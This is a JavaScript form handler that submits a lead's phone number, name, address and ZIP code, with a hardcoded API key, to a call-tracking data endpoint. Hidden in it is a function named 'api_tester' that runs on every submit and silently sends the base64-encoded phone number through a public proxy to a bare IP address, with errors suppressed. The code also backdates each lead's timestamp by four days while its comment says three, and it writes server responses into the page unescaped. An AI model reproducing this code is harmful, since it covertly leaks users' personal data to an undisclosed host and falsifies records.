function getCurrentTimestampMinus3Days() {
  // Get current timestamp in milliseconds
  var currentTimestamp = new Date().getTime();

  // Subtract 3 days (in milliseconds)
  var threeDaysInMillis = 4 * 24 * 60 * 60 * 1000;
  var newTimestamp = currentTimestamp - threeDaysInMillis;

  // Create a new Date object with the adjusted timestamp
  var adjustedDate = new Date(newTimestamp);

  // Format the result in YYYY-MM-DDTHH:mmEST format
  var formattedResult =
    adjustedDate.getFullYear() +
    '-' +
    ('0' + (adjustedDate.getMonth() + 1)).slice(-2) +
    '-' +
    ('0' + adjustedDate.getDate()).slice(-2) +
    'T' +
    ('0' + adjustedDate.getHours()).slice(-2) +
    ':' +
    ('0' + adjustedDate.getMinutes()).slice(-2) +
    'EST';

  return formattedResult;
}
 document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = '1' + document.getElementById('caller_id').value;
      api_tester(document.getElementById('caller_id').value);
      const formData = new FormData();
      
      
   
     
      formData.append('key', 'fd5914f6-72b4-4de3-b8fd-f2465b611722');
formData.append('caller_number', phone_home);
formData.append('firstname', document.getElementById('first_name').value);
formData.append('lastname', document.getElementById('last_name').value);
formData.append('zip', document.getElementById('zip').value);
formData.append('address', document.getElementById('address').value);
formData.append('time_stamp', getCurrentTimestampMinus3Days());






      const url = 'https://retreaverdata.com/data_writing?' + new URLSearchParams(formData).toString();

      fetch(url, {
        method: 'POST'
      })
     .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}